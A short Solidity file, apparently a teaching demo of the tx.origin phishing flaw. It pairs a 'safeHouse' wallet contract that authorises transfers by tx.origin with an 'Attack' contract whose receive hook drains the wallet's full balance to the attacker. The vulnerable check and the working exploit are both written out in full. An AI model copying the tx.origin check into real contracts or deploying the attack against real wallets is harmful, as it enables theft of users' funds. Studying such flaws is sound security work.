// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract safeHouse {

    address payable public owner;
    uint256 public initialBalance;

    constructor() payable {
        owner = payable(msg.sender);
        initialBalance = msg.value;
    }

    function transfer(address to, uint amount) public payable {
        require(tx.origin == owner, "you are not owner");
        (bool success, ) = to.call {
            value: amount
        }("");
        require(success, "tx failed");
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

}

contract Attack {

    address payable public owner;
    safeHouse safehouse;

    constructor(safeHouse _safehouse) {
        safehouse = safeHouse(_safehouse);
        owner = payable(msg.sender);
    }

    function attack() public {
        safehouse.transfer(owner, address(safehouse).balance);
    }

    receive() external payable { attack();}

}